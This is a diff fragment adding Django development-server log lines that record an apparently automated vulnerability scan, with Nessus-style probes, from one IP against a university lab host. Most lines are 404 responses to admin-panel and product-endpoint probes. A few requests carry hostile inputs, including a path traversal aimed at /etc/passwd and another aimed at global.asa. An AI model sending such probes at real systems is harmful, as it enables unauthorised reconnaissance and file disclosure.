+[08/Oct/2023 04:34:43] "GET /idm/login.jsp?lang=en&cntry= HTTP/1.1" 404 5341
+[08/Oct/2023 04:34:43,373] - Broken pipe from ('130.253.1.147', 56600)
+
+[08/Oct/2023 04:34:43] "GET / HTTP/1.1" 200 35341
+[08/Oct/2023 04:34:43,538] - Broken pipe from ('130.253.1.147', 57116)
+
+Not Found: /config-browser/showJars.xhtml
+[08/Oct/2023 04:34:43] "GET /config-browser/showJars.xhtml HTTP/1.1" 404 5370
+Not Found: /index.JSP
+[08/Oct/2023 04:34:43] "GET /index.JSP HTTP/1.1" 404 5310
+[08/Oct/2023 04:34:43] "GET / HTTP/1.1" 200 35341
+[08/Oct/2023 04:34:43,906] - Broken pipe from ('130.253.1.147', 57110)
+
+[08/Oct/2023 04:34:43,907] - Broken pipe from ('130.253.1.147', 57422)
+
+[08/Oct/2023 04:34:44] "GET / HTTP/1.1" 200 35341
+[08/Oct/2023 04:34:44] "GET / HTTP/1.1" 200 35341
+[08/Oct/2023 04:34:44] "GET / HTTP/1.1" 200 35341
+Not Found: /login
+[08/Oct/2023 04:34:44] "GET /login HTTP/1.1" 404 5298
+[08/Oct/2023 04:34:44,159] - Broken pipe from ('130.253.1.147', 58064)
+
+[08/Oct/2023 04:34:44] "GET / HTTP/1.1" 200 35341
+[08/Oct/2023 04:34:44,238] - Broken pipe from ('130.253.1.147', 58124)
+
+Not Found: /userportal/webpages/myaccount/login.jsp
+[08/Oct/2023 04:34:44] "GET /userportal/webpages/myaccount/login.jsp HTTP/1.1" 404 5400
+[08/Oct/2023 04:34:44] "GET / HTTP/1.1" 200 35341
+[08/Oct/2023 04:34:44] "GET / HTTP/1.1" 200 35341
+[08/Oct/2023 04:34:44,494] - Broken pipe from ('130.253.1.147', 58550)
+
+Not Found: /webconsole/webpages/login.jsp
+[08/Oct/2023 04:34:44] "GET /webconsole/webpages/login.jsp HTTP/1.1" 404 5370
+[08/Oct/2023 04:34:44] "GET / HTTP/1.1" 200 35341
+[08/Oct/2023 04:34:44] "GET / HTTP/1.1" 200 35341
+[08/Oct/2023 04:34:44,854] - Broken pipe from ('130.253.1.147', 58548)
+
+Not Found: /api/sonicos/is-sslvpn-enabled
+[08/Oct/2023 04:34:44] "GET /api/sonicos/is-sslvpn-enabled HTTP/1.1" 404 5370
+[08/Oct/2023 04:34:44] "GET / HTTP/1.1" 200 35341
+[08/Oct/2023 04:34:45,087] - Broken pipe from ('130.253.1.147', 59122)
+
+[08/Oct/2023 04:34:45,095] - Broken pipe from ('130.253.1.147', 58810)
+
+Not Found: /sgms/login
+[08/Oct/2023 04:34:45] "GET /sgms/login HTTP/1.1" 404 5313
+[08/Oct/2023 04:34:45] "GET / HTTP/1.1" 200 35341
+Not Found: /login.html
+[08/Oct/2023 04:34:45] "GET /login.html HTTP/1.1" 404 5313
+[08/Oct/2023 04:34:45] "GET / HTTP/1.1" 200 35341
+[08/Oct/2023 04:34:45,232] - Broken pipe from ('130.253.1.147', 59274)
+
+[08/Oct/2023 04:34:45] "GET / HTTP/1.1" 200 35341
+[08/Oct/2023 04:34:45,368] - Broken pipe from ('130.253.1.147', 59618)
+
+[08/Oct/2023 04:34:45] "GET / HTTP/1.1" 200 35341
+Not Found: /admincp/login.php
+Not Found: /index.html
+[08/Oct/2023 04:34:45] "GET //admincp/login.php HTTP/1.1" 404 5334
+[08/Oct/2023 04:34:45] "GET /index.html HTTP/1.1" 404 5313
+Not Found: /solr/#
+[08/Oct/2023 04:34:45] "GET /solr/# HTTP/1.1" 404 5303
+[08/Oct/2023 04:34:45,555] - Broken pipe from ('130.253.1.147', 59916)
+
+[08/Oct/2023 04:34:45] "GET / HTTP/1.1" 200 35341
+[08/Oct/2023 04:34:45,634] - Broken pipe from ('130.253.1.147', 59808)
+
+Not Found: /helpdesk/WebObjects/Helpdesk.woa
+[08/Oct/2023 04:34:45] "GET /helpdesk/WebObjects/Helpdesk.woa HTTP/1.1" 404 5379
+[08/Oct/2023 04:34:45] "GET / HTTP/1.1" 200 35341
+Not Found: /#
+[08/Oct/2023 04:34:45] "GET /# HTTP/1.1" 404 5288
+[08/Oct/2023 04:34:45] "GET / HTTP/1.1" 200 35341
+[08/Oct/2023 04:34:45,803] - Broken pipe from ('130.253.1.147', 60102)
+
+[08/Oct/2023 04:34:45,811] - Broken pipe from ('130.253.1.147', 59952)
+
+[08/Oct/2023 04:34:45] "GET / HTTP/1.1" 200 35341
+Not Found: /swvm/ConsoleContainer.jsp
+[08/Oct/2023 04:34:45] "GET /swvm/ConsoleContainer.jsp HTTP/1.1" 404 5358
+[08/Oct/2023 04:34:45] "GET / HTTP/1.1" 200 35341
+Not Found: /api2/Localization/SolarWinds.Orion.SamAppOptics.Strings.dll
+[08/Oct/2023 04:34:45] "GET /api2/Localization/SolarWinds.Orion.SamAppOptics.Strings.dll HTTP/1.1" 404 5460
+[08/Oct/2023 04:34:45,976] - Broken pipe from ('130.253.1.147', 60354)
+
+Not Found: /Orion/Login.aspx
+[08/Oct/2023 04:34:46] "GET /Orion/Login.aspx HTTP/1.1" 404 5331
+[08/Oct/2023 04:34:46] "GET / HTTP/1.1" 200 35341
+Not Found: /lem/index.html
+[08/Oct/2023 04:34:46] "GET / HTTP/1.1" 200 35341
+[08/Oct/2023 04:34:46] "GET /lem/index.html HTTP/1.1" 404 5325
+Not Found: /Orion/Login.asp
+[08/Oct/2023 04:34:46] "GET /Orion/Login.asp HTTP/1.1" 404 5328
+[08/Oct/2023 04:34:46,148] - Broken pipe from ('130.253.1.147', 60688)
+
+[08/Oct/2023 04:34:46,153] - Broken pipe from ('130.253.1.147', 60390)
+
+Not Found: /SilverStream
+Not Found: /sitemap.xml
+[08/Oct/2023 04:34:46] "GET /SilverStream HTTP/1.1" 404 5313
+[08/Oct/2023 04:34:46] "GET /sitemap.xml HTTP/1.1" 404 5310
+[08/Oct/2023 04:34:46,289] - Broken pipe from ('130.253.1.147', 60616)
+
+Not Found: /SilverStream/Meta/Tables/
+Not Found: /sitemap/sitemap.xml
+[08/Oct/2023 04:34:46] "GET /SilverStream/Meta/Tables/?access-mode=text HTTP/1.1" 404 5369
+[08/Oct/2023 04:34:46] "GET /sitemap/sitemap.xml HTTP/1.1" 404 5334
+Not Found: /av-centerd
+[08/Oct/2023 04:34:46] "POST /av-centerd HTTP/1.1" 404 5314
+[08/Oct/2023 04:34:46,490] - Broken pipe from ('130.253.1.147', 60842)
+
+Not Found: /map/sitemap.xml
+[08/Oct/2023 04:34:46] "GET /map/sitemap.xml HTTP/1.1" 404 5322
+[08/Oct/2023 04:34:46] "GET / HTTP/1.1" 200 35341
+Not Found: /servlet/com.newatlanta.servletexec.JSP10Servlet
+[08/Oct/2023 04:34:46] "GET /servlet/com.newatlanta.servletexec.JSP10Servlet HTTP/1.1" 404 5418
+[08/Oct/2023 04:34:46] "GET / HTTP/1.1" 200 35341
+Not Found: /servlet/com.newatlanta.servletexec.JSP10Servlet/..\..\global.asa
+[08/Oct/2023 04:34:46] "GET /servlet/com.newatlanta.servletexec.JSP10Servlet/..%5c..%5cglobal.asa HTTP/1.1" 404 5473
+[08/Oct/2023 04:34:46] "GET / HTTP/1.1" 200 35341
+Not Found: /stream/0
+[08/Oct/2023 04:34:46] "GET /stream/0 HTTP/1.1" 404 5307
+[08/Oct/2023 04:34:46] "GET / HTTP/1.1" 200 35341
+Not Found: /content/YMdWRPXtOf.mp3
+[08/Oct/2023 04:34:46] "GET /content/YMdWRPXtOf.mp3 HTTP/1.0" 404 5349
+Not Found: /SchneiderUPS/
+[08/Oct/2023 04:34:46] "GET /SchneiderUPS/ HTTP/1.1" 404 5322
+[08/Oct/2023 04:34:47,003] - Broken pipe from ('130.253.1.147', 33344)
+
+[08/Oct/2023 04:34:47,005] - Broken pipe from ('130.253.1.147', 33126)
+
+[08/Oct/2023 04:34:47,005] - Broken pipe from ('130.253.1.147', 33138)
+
+[08/Oct/2023 04:34:47] code 400, message Bad request syntax ('\x16\x03\x01\x00¿\x01\x00\x00»\x03\x01Én')
+[08/Oct/2023 04:34:47] You're accessing the development server over HTTPS, but it only supports HTTP.
+
+[08/Oct/2023 04:34:47] "GET / HTTP/1.1" 200 35341
+[08/Oct/2023 04:34:47] "GET / HTTP/1.1" 200 35341
+Not Found: /wbm/login/
+[08/Oct/2023 04:34:47] "GET //wbm/login/ HTTP/1.1" 404 5313
+[08/Oct/2023 04:34:47] "GET / HTTP/1.1" 200 35341
+[08/Oct/2023 04:34:47,175] - Broken pipe from ('130.253.1.147', 33466)
+
+Not Found: /InitialPage.asp
+[08/Oct/2023 04:34:47] "GET /InitialPage.asp HTTP/1.1" 404 5328
+Not Found: /Portal/Portal.mwsl
+[08/Oct/2023 04:34:47] "GET /Portal/Portal.mwsl?MainSelection=USFW&TabSelection=NONE&ClientArea=/Portal/usfw-login.mwsl&DataFile=NONE&TemplateFile=NONE HTTP/1.1" 404 5457
+Not Found: /home.htm
+[08/Oct/2023 04:34:47] "GET /home.htm HTTP/1.1" 404 5307
+[08/Oct/2023 04:34:47] "GET / HTTP/1.1" 200 35341
+[08/Oct/2023 04:34:47,339] - Broken pipe from ('130.253.1.147', 33640)
+
+[08/Oct/2023 04:34:47,339] - Broken pipe from ('130.253.1.147', 33652)
+
+[08/Oct/2023 04:34:47,339] - Broken pipe from ('130.253.1.147', 33646)
+
+Not Found: /home.asp
+[08/Oct/2023 04:34:47] "GET /home.asp HTTP/1.1" 404 5307
+[08/Oct/2023 04:34:47] "GET / HTTP/1.1" 200 35341
+[08/Oct/2023 04:34:47] "GET / HTTP/1.1" 200 35341
+Not Found: /index.html
+[08/Oct/2023 04:34:47] "GET /index.html HTTP/1.1" 404 5313
+[08/Oct/2023 04:34:47,613] - Broken pipe from ('130.253.1.147', 33946)
+
+[08/Oct/2023 04:34:47] "GET / HTTP/1.1" 200 35341
+[08/Oct/2023 04:34:47] "GET / HTTP/1.1" 200 35341
+Not Found: /plc/webvisu.htm
+Not Found: /no_such_file_NWYkbaJm.html
+[08/Oct/2023 04:34:47] "GET /plc/webvisu.htm HTTP/1.1" 404 5328
+[08/Oct/2023 04:34:47] "GET /no_such_file_NWYkbaJm.html HTTP/1.1" 404 5361
+[08/Oct/2023 04:34:47,739] - Broken pipe from ('130.253.1.147', 34078)
+
+[08/Oct/2023 04:34:47,740] - Broken pipe from ('130.253.1.147', 34082)
+
+[08/Oct/2023 04:34:47] "GET / HTTP/1.1" 200 35341
+Not Found: /html/iscscada.htm
+[08/Oct/2023 04:34:47] "GET /html/iscscada.htm HTTP/1.1" 404 5334
+[08/Oct/2023 04:34:47,826] - Broken pipe from ('130.253.1.147', 34274)
+
+[08/Oct/2023 04:34:47] "GET / HTTP/1.1" 200 35341
+[08/Oct/2023 04:34:47] "GET / HTTP/1.1" 200 35341
+[08/Oct/2023 04:34:47,877] - Broken pipe from ('130.253.1.147', 34438)
+
+[08/Oct/2023 04:34:47] "GET / HTTP/1.1" 200 35341
+[08/Oct/2023 04:34:47] "GET / HTTP/1.1" 200 35341
+Not Found: /web/signin
+[08/Oct/2023 04:34:48] "GET /web/signin HTTP/1.1" 404 5313
+Not Found: /OEMSettings.ini
+[08/Oct/2023 04:34:48] "GET /OEMSettings.ini HTTP/1.1" 404 5328
+Not Found: /broadWeb/bwRoot.asp
+[08/Oct/2023 04:34:48] "GET /broadWeb/bwRoot.asp HTTP/1.1" 404 5340
+Not Found: /iView3/pages/version.frag
+[08/Oct/2023 04:34:48] "GET /iView3/pages/version.frag HTTP/1.1" 404 5358
+[08/Oct/2023 04:34:48,023] - Broken pipe from ('130.253.1.147', 34688)
+
+[08/Oct/2023 04:34:48,024] - Broken pipe from ('130.253.1.147', 34514)
+
+[08/Oct/2023 04:34:48,026] - Broken pipe from ('130.253.1.147', 34686)
+
+Not Found: /main/web/status/
+[08/Oct/2023 04:34:48] "GET / HTTP/1.1" 200 35341
+[08/Oct/2023 04:34:48] "GET /main/web/status/ HTTP/1.1" 404 5331
+[08/Oct/2023 04:34:48] "GET / HTTP/1.1" 200 35341
+[08/Oct/2023 04:34:48] "GET / HTTP/1.1" 200 35341
+[08/Oct/2023 04:34:48,147] - Broken pipe from ('130.253.1.147', 34516)
+
+[08/Oct/2023 04:34:48] "GET / HTTP/1.1" 200 35341
+Not Found: /sapmc/sapmc.html
+[08/Oct/2023 04:34:48] "GET /sapmc/sapmc.html HTTP/1.1" 404 5331
+Not Found: /sawmillcl.exe
+[08/Oct/2023 04:34:48] "POST /sawmillcl.exe HTTP/1.1" 404 5323
+Not Found: /SAPHostControl/
+[08/Oct/2023 04:34:48] "GET /SAPHostControl/?wsdl HTTP/1.1" 404 5333
+[08/Oct/2023 04:34:48,286] - Broken pipe from ('130.253.1.147', 34868)
+
+[08/Oct/2023 04:34:48,330] - Broken pipe from ('130.253.1.147', 34866)
+
+Not Found: /sawmillcl.exe
+[08/Oct/2023 04:34:48] "GET /sawmillcl.exe?ho+{COMPLETE_VERSION} HTTP/1.1" 404 5348
+Not Found: /AdminTools/querybuilder/nn.jsp
+[08/Oct/2023 04:34:48] "GET /AdminTools/querybuilder/nn.jsp HTTP/1.1" 404 5373
+Not Found: /search/results.stm
+[08/Oct/2023 04:34:48] "GET /search/results.stm HTTP/1.1" 404 5331
+[08/Oct/2023 04:34:48] "GET / HTTP/1.1" 200 35341
+[08/Oct/2023 04:34:48,439] - Broken pipe from ('130.253.1.147', 35024)
+
+Not Found: /sawmill6cl.exe
+[08/Oct/2023 04:34:48] "POST /sawmill6cl.exe HTTP/1.1" 404 5326
+[08/Oct/2023 04:34:48] "GET / HTTP/1.1" 200 35341
+Not Found: /apps/zxtm/login.cgi
+[08/Oct/2023 04:34:48] "GET /apps/zxtm/login.cgi HTTP/1.1" 404 5340
+[08/Oct/2023 04:34:48] "GET / HTTP/1.1" 200 35341
+Not Found: /sawmill6cl.exe
+[08/Oct/2023 04:34:48] "GET /sawmill6cl.exe?ho+{COMPLETE_VERSION} HTTP/1.1" 404 5351
+Not Found: /login
+[08/Oct/2023 04:34:48] "GET /login HTTP/1.1" 404 5298
+[08/Oct/2023 04:34:48,696] - Broken pipe from ('130.253.1.147', 35250)
+
+[08/Oct/2023 04:34:48,696] - Broken pipe from ('130.253.1.147', 35318)
+
+Forbidden (CSRF cookie not set.): /
+[08/Oct/2023 04:34:48] "POST / HTTP/1.1" 403 2870
+Not Found: /names.nsf/view
+[08/Oct/2023 04:34:48] "GET /names.nsf/view?ReadDesign HTTP/1.1" 404 5330
+Not Found: /vncviewer.jar
+[08/Oct/2023 04:34:49] "GET /vncviewer.jar HTTP/1.1" 404 5322
+[08/Oct/2023 04:34:49] "GET /?ho+{COMPLETE_VERSION} HTTP/1.1" 200 35341
+[08/Oct/2023 04:34:49] "GET / HTTP/1.1" 200 35341
+[08/Oct/2023 04:34:49,089] - Broken pipe from ('130.253.1.147', 35420)
+
+[08/Oct/2023 04:34:49] "GET / HTTP/1.1" 200 35341
+[08/Oct/2023 04:34:49,120] - Broken pipe from ('130.253.1.147', 34846)
+
+[08/Oct/2023 04:34:49] "GET / HTTP/1.1" 200 35341
+Not Found: /index.html
+[08/Oct/2023 04:34:49] "GET /index.html HTTP/1.1" 404 5313
+[08/Oct/2023 04:34:49] "GET / HTTP/1.1" 200 35341
+[08/Oct/2023 04:34:49,291] - Broken pipe from ('130.253.1.147', 35960)
+
+[08/Oct/2023 04:34:49] "GET / HTTP/1.1" 200 35341
+Not Found: /cgi-bin/authLogin.cgi
+[08/Oct/2023 04:34:49] "GET /cgi-bin/authLogin.cgi HTTP/1.1" 404 5346
+Not Found: /photo/lang/ENG.js
+[08/Oct/2023 04:34:49] "GET /photo/lang/ENG.js HTTP/1.1" 404 5334
+[08/Oct/2023 04:34:49,416] - Broken pipe from ('130.253.1.147', 35964)
+
+[08/Oct/2023 04:34:49,416] - Broken pipe from ('130.253.1.147', 36076)
+
+Not Found: /1696739689/facts/kimlab01-vlp.du.edu
+[08/Oct/2023 04:34:49] "GET /1696739689/facts/kimlab01-vlp.du.edu HTTP/1.1" 404 5391
+[08/Oct/2023 04:34:49] "GET / HTTP/1.1" 200 35341
+[08/Oct/2023 04:34:49] "GET / HTTP/1.1" 200 35341
+Not Found: /cas/login
+[08/Oct/2023 04:34:49] "GET /cas/login HTTP/1.1" 404 5310
+Not Found: /1696739689/certificate/kimlab01-vlp.du.edu
+[08/Oct/2023 04:34:49] "GET /1696739689/certificate/kimlab01-vlp.du.edu HTTP/1.1" 404 5409
+Not Found: /login
+Not Found: /auth/login
+[08/Oct/2023 04:34:50] "GET /login HTTP/1.1" 404 5298
+[08/Oct/2023 04:34:50] "GET /auth/login HTTP/1.1" 404 5313
+Not Found: /v2.0/environments/kimlab01-vlp.du.edu
+Not Found: /cgi-bin/printenv
+[08/Oct/2023 04:34:50] "GET /v2.0/environments/kimlab01-vlp.du.edu HTTP/1.1" 404 5394
+[08/Oct/2023 04:34:50] "GET /cgi-bin/printenv HTTP/1.1" 404 5331
+[08/Oct/2023 04:34:50,026] - Broken pipe from ('130.253.1.147', 36306)
+
+[08/Oct/2023 04:34:50,027] - Broken pipe from ('130.253.1.147', 36634)
+
+[08/Oct/2023 04:34:50,027] - Broken pipe from ('130.253.1.147', 36640)
+
+[08/Oct/2023 04:34:50] "GET / HTTP/1.1" 200 35341
+Not Found: /puppet-ca/v1/certificate/kimlab01-vlp.du.edu
+[08/Oct/2023 04:34:50] "GET /puppet-ca/v1/certificate/kimlab01-vlp.du.edu HTTP/1.1" 404 5415
+[08/Oct/2023 04:34:50] "GET / HTTP/1.1" 200 35341
+[08/Oct/2023 04:34:50] "GET / HTTP/1.1" 200 35341
+Not Found: /index.php
+[08/Oct/2023 04:34:50] "GET /index.php?app=main&inc=core_auth&route=login HTTP/1.1" 404 5353
+Not Found: /puppet/v3/facts/kimlab01-vlp.du.edu
+[08/Oct/2023 04:34:50] "GET /puppet/v3/facts/kimlab01-vlp.du.edu HTTP/1.1" 404 5388
+[08/Oct/2023 04:34:50,351] - Broken pipe from ('130.253.1.147', 37102)
+
+[08/Oct/2023 04:34:50,353] - Broken pipe from ('130.253.1.147', 36118)
+
+Not Found: /perl
+Not Found: /cgi-bin/pdesk.cgi
+[08/Oct/2023 04:34:50] "GET //perl?-v HTTP/1.1" 404 5298
+[08/Oct/2023 04:34:50] "GET /cgi-bin/pdesk.cgi?lang=../../../../../../../../etc/passwd%00 HTTP/1.1" 404 5377
+[08/Oct/2023 04:34:50] "GET / HTTP/1.1" 200 35341
+[08/Oct/2023 04:34:50,507] - Broken pipe from ('130.253.1.147', 37200)
+
+[08/Oct/2023 04:34:50] "GET / HTTP/1.1" 200 35341
+[08/Oct/2023 04:34:50] "GET / HTTP/1.1" 200 35341
+Not Found: /perl.exe
+[08/Oct/2023 04:34:50] "GET //perl.exe?-v HTTP/1.1" 404 5310
+Not Found: /html/en/index.htm
+[08/Oct/2023 04:34:50] "GET /html/en/index.htm HTTP/1.1" 404 5334
+[08/Oct/2023 04:34:50,565] - Broken pipe from ('130.253.1.147', 37190)
+
+[08/Oct/2023 04:34:50] "GET / HTTP/1.1" 200 35341
+[08/Oct/2023 04:34:50,636] - Broken pipe from ('130.253.1.147', 37476)
+
+Not Found: /login
+[08/Oct/2023 04:34:50] "GET /login HTTP/1.1" 404 5298
+[08/Oct/2023 04:34:50] "GET /admin HTTP/1.1" 301 0
+[08/Oct/2023 04:34:50,709] - Broken pipe from ('130.253.1.147', 37484)
+
+[08/Oct/2023 04:34:50,711] - Broken pipe from ('130.253.1.147', 37664)
+
+Not Found: /login.htm
+[08/Oct/2023 04:34:50] "GET /admin HTTP/1.1" 301 0
+[08/Oct/2023 04:34:50] "GET /login.htm HTTP/1.1" 404 5304
+Not Found: /exchweb/bin/auth/owalogon.asp
+[08/Oct/2023 04:34:50] "GET /exchweb/bin/auth/owalogon.asp?url=http://12345678910 HTTP/1.1" 404 5387
+[08/Oct/2023 04:34:50] "GET / HTTP/1.1" 200 35341
+[08/Oct/2023 04:34:50,764] - Broken pipe from ('130.253.1.147', 37734)
+
+[08/Oct/2023 04:34:50] "GET / HTTP/1.1" 200 35341
+[08/Oct/2023 04:34:50] "GET / HTTP/1.1" 200 35341
+[08/Oct/2023 04:34:50] "GET / HTTP/1.1" 200 35341
+Not Found: /otrs/index.pl
+Not Found: /.DS_Store
+[08/Oct/2023 04:34:50] "GET /otrs/index.pl HTTP/1.1" 404 5322
+Not Found: /ws_utc/login.do
+Not Found: /av/api/1.0/system/local/tasks
+[08/Oct/2023 04:34:50] "GET /.DS_Store HTTP/1.1" 404 5310
+[08/Oct/2023 04:34:50] "GET /ws_utc/login.do HTTP/1.1" 404 5328
+[08/Oct/2023 04:34:50] "GET /av/api/1.0/system/local/tasks HTTP/1.1" 404 5370
+[08/Oct/2023 04:34:51,183] - Broken pipe from ('130.253.1.147', 37898)
+
+[08/Oct/2023 04:34:51,183] - Broken pipe from ('130.253.1.147', 37938)
+
+[08/Oct/2023 04:34:51,184] - Broken pipe from ('130.253.1.147', 37960)
+
+Not Found: /wls_utc/
+[08/Oct/2023 04:34:51] "GET /wls_utc/ HTTP/1.1" 404 5307
+[08/Oct/2023 04:34:51] "GET / HTTP/1.1" 200 35341
+[08/Oct/2023 04:34:51] "GET / HTTP/1.1" 200 35341
+[08/Oct/2023 04:34:51] "GET / HTTP/1.1" 200 35341
+[08/Oct/2023 04:34:51,351] - Broken pipe from ('130.253.1.147', 38040)
+
+[08/Oct/2023 04:34:51] "GET / HTTP/1.1" 200 35341
+Not Found: /cs/idcplg
+[08/Oct/2023 04:34:51] "GET /cs/idcplg?IdcService=GET_ENVIRONMENT&IsJson=1 HTTP/1.1" 404 5350
+Not Found: /web-determinations/
+[08/Oct/2023 04:34:51] "GET / HTTP/1.1" 200 35341
+[08/Oct/2023 04:34:51] "GET /web-determinations/?CookieSet=true HTTP/1.1" 404 5355
+[08/Oct/2023 04:34:51,557] - Broken pipe from ('130.253.1.147', 38498)
+
+[08/Oct/2023 04:34:51,588] - Broken pipe from ('130.253.1.147', 38500)
+
+Not Found: /idc/idcplg
+[08/Oct/2023 04:34:51] "GET /idc/idcplg?IdcService=GET_ENVIRONMENT&IsJson=1 HTTP/1.1" 404 5353
+[08/Oct/2023 04:34:51] "GET / HTTP/1.1" 200 35341
+Not Found: /sgdadmin/faces/jsp/Version.jsp
+[08/Oct/2023 04:34:51] "GET /sgdadmin/faces/jsp/Version.jsp HTTP/1.1" 404 5373
+[08/Oct/2023 04:34:51] "GET / HTTP/1.1" 200 35341
+[08/Oct/2023 04:34:51,718] - Broken pipe from ('130.253.1.147', 38616)
+
+Not Found: /idcplg
+[08/Oct/2023 04:34:51] "GET //idcplg?IdcService=GET_ENVIRONMENT&IsJson=1 HTTP/1.1" 404 5341
+Not Found: /gateway/login
+[08/Oct/2023 04:34:51] "GET /gateway/login HTTP/1.1" 404 5322
+[08/Oct/2023 04:34:51] "GET / HTTP/1.1" 200 35341
+[08/Oct/2023 04:34:51,773] - Broken pipe from ('130.253.1.147', 38496)
+
+[08/Oct/2023 04:34:51,773] - Broken pipe from ('130.253.1.147', 38866)
+
+Not Found: /portal/page/portal/Design_Time_PG/Welcome
+[08/Oct/2023 04:34:51] "GET /portal/page/portal/Design_Time_PG/Welcome HTTP/1.1" 404 5406
+[08/Oct/2023 04:34:51] "GET / HTTP/1.1" 200 35341
+[08/Oct/2023 04:34:51] "GET / HTTP/1.1" 200 35341
+Not Found: /page/portal/Design_Time_PG/Welcome
+[08/Oct/2023 04:34:51] "GET /page/portal/Design_Time_PG/Welcome HTTP/1.1" 404 5385
+Not Found: /mapviewer/omserver
+[08/Oct/2023 04:34:51] "GET /mapviewer/omserver?getv=t HTTP/1.1" 404 5344
+[08/Oct/2023 04:34:51] "GET / HTTP/1.1" 200 35341
+Not Found: /dndirector/dashboard/Show.dn
+[08/Oct/2023 04:34:51] "GET /dndirector/dashboard/Show.dn HTTP/1.1" 404 5367
+[08/Oct/2023 04:34:51,982] - Broken pipe from ('130.253.1.147', 38876)
+
+[08/Oct/2023 04:34:52,030] - Broken pipe from ('130.253.1.147', 39026)
+
+[08/Oct/2023 04:34:52] "GET / HTTP/1.1" 200 35341
+[08/Oct/2023 04:34:52] "GET / HTTP/1.1" 200 35341
+[08/Oct/2023 04:34:52,115] - Broken pipe from ('130.253.1.147', 39094)
+
+[08/Oct/2023 04:34:52,140] - Broken pipe from ('130.253.1.147', 39090)
+
+[08/Oct/2023 04:34:52] "GET / HTTP/1.1" 200 35341
+[08/Oct/2023 04:34:52] "GET / HTTP/1.1" 200 35341
+Not Found: /portal/pls/portal/PORTAL_DEMO.ORG_CHART.SHOW
+[08/Oct/2023 04:34:52] "GET /portal/pls/portal/PORTAL_DEMO.ORG_CHART.SHOW HTTP/1.1" 404 5415
+Not Found: /ords/
+[08/Oct/2023 04:34:52] "GET /ords/ HTTP/1.1" 404 5298
+Not Found: /btmui/
+[08/Oct/2023 04:34:52] "GET /btmui/ HTTP/1.1" 404 5301
+[08/Oct/2023 04:34:52,619] - Broken pipe from ('130.253.1.147', 39360)
+
+Not Found: /apex/listenerConfigure
+Not Found: /portal/pls/portal/DEV_PORTAL_DEMO.ORG_CHART.SHOW
+[08/Oct/2023 04:34:52] "GET /apex/listenerConfigure HTTP/1.1" 404 5349
+[08/Oct/2023 04:34:52] "GET /portal/pls/portal/DEV_PORTAL_DEMO.ORG_CHART.SHOW HTTP/1.1" 404 5427
+Not Found: /apex/f
+[08/Oct/2023 04:34:52] "GET /apex/f?p=nessuscheck HTTP/1.1" 404 5309
+[08/Oct/2023 04:34:52,676] - Broken pipe from ('130.253.1.147', 39486)
+
+Not Found: /dndirector
+[08/Oct/2023 04:34:52] "GET /dndirector HTTP/1.1" 404 5313
+Not Found: /pls/apex/f
+[08/Oct/2023 04:34:52] "GET /pls/apex/f?p=nessuscheck HTTP/1.1" 404 5321
+Not Found: /portal/pls/portal/DEV1_PORTAL_DEMO.ORG_CHART.SHOW
+[08/Oct/2023 04:34:52] "GET /portal/pls/portal/DEV1_PORTAL_DEMO.ORG_CHART.SHOW HTTP/1.1" 404 5430
+[08/Oct/2023 04:34:52] "GET / HTTP/1.1" 200 35341
+[08/Oct/2023 04:34:52,853] - Broken pipe from ('130.253.1.147', 39484)
+
+Not Found: /portal/pls/portal/DEV2_PORTAL_DEMO.ORG_CHART.SHOW
+[08/Oct/2023 04:34:52] "GET /portal/pls/portal/DEV2_PORTAL_DEMO.ORG_CHART.SHOW HTTP/1.1" 404 5430
+[08/Oct/2023 04:34:53] "GET / HTTP/1.1" 200 35341
+[08/Oct/2023 04:34:53] "GET / HTTP/1.1" 200 35341
+Not Found: /portal/pls/portal/DEV3_PORTAL_DEMO.ORG_CHART.SHOW
+[08/Oct/2023 04:34:53] "GET /portal/pls/portal/DEV3_PORTAL_DEMO.ORG_CHART.SHOW HTTP/1.1" 404 5430
+Not Found: /cgi-bin/luci
+[08/Oct/2023 04:34:53] "GET /cgi-bin/luci HTTP/1.1" 404 5319
+Not Found: /dwr/index.html
+[08/Oct/2023 04:34:53] "GET /dwr/index.html HTTP/1.1" 404 5325
+[08/Oct/2023 04:34:53,178] - Broken pipe from ('130.253.1.147', 40050)
+
+[08/Oct/2023 04:34:53,179] - Broken pipe from ('130.253.1.147', 40312)
+
+Not Found: /portal/pls/portal/DEV4_PORTAL_DEMO.ORG_CHART.SHOW
+[08/Oct/2023 04:34:53] "GET /portal/pls/portal/DEV4_PORTAL_DEMO.ORG_CHART.SHOW HTTP/1.1" 404 5430
+[08/Oct/2023 04:34:53] "GET / HTTP/1.1" 200 35341
+[08/Oct/2023 04:34:53] "GET / HTTP/1.1" 200 35341
+Not Found: /login.jsp
+[08/Oct/2023 04:34:53] "GET /login.jsp HTTP/1.1" 404 5310
+Not Found: /portal/pls/portal/DEV5_PORTAL_DEMO.ORG_CHART.SHOW
+[08/Oct/2023 04:34:53] "GET /portal/pls/portal/DEV5_PORTAL_DEMO.ORG_CHART.SHOW HTTP/1.1" 404 5430
+[08/Oct/2023 04:34:53,316] - Broken pipe from ('130.253.1.147', 40316)
+
+[08/Oct/2023 04:34:53] "GET / HTTP/1.1" 200 35341
+Not Found: /portal/pls/portal/DEV6_PORTAL_DEMO.ORG_CHART.SHOW
+[08/Oct/2023 04:34:53] "GET /portal/pls/portal/DEV6_PORTAL_DEMO.ORG_CHART.SHOW HTTP/1.1" 404 5430
+Not Found: /cgi-bin/pub/pki
+[08/Oct/2023 04:34:53] "GET /cgi-bin/pub/pki?cmd=serverInfo HTTP/1.1" 404 5343
+Not Found: /something/maybe/ping
+[08/Oct/2023 04:34:53] "POST /something/maybe/ping HTTP/1.1" 404 5344
+Not Found: /portal/pls/portal/DEV7_PORTAL_DEMO.ORG_CHART.SHOW
+[08/Oct/2023 04:34:53] "GET /portal/pls/portal/DEV7_PORTAL_DEMO.ORG_CHART.SHOW HTTP/1.1" 404 5430
+[08/Oct/2023 04:34:53,380] - Broken pipe from ('130.253.1.147', 40630)
+
+Not Found: /ofbizsetup/control/checkLogin
+[08/Oct/2023 04:34:53] "GET /ofbizsetup/control/checkLogin HTTP/1.1" 404 5370
+Not Found: /portal/pls/portal/DEV8_PORTAL_DEMO.ORG_CHART.SHOW
+[08/Oct/2023 04:34:53] "GET /portal/pls/portal/DEV8_PORTAL_DEMO.ORG_CHART.SHOW HTTP/1.1" 404 5430
+[08/Oct/2023 04:34:53,441] - Broken pipe from ('130.253.1.147', 40626)
+
+Not Found: /ordermgr/control/checkLogin
+[08/Oct/2023 04:34:53] "GET /ordermgr/control/checkLogin HTTP/1.1" 404 5364
+[08/Oct/2023 04:34:53] "GET / HTTP/1.1" 200 35341
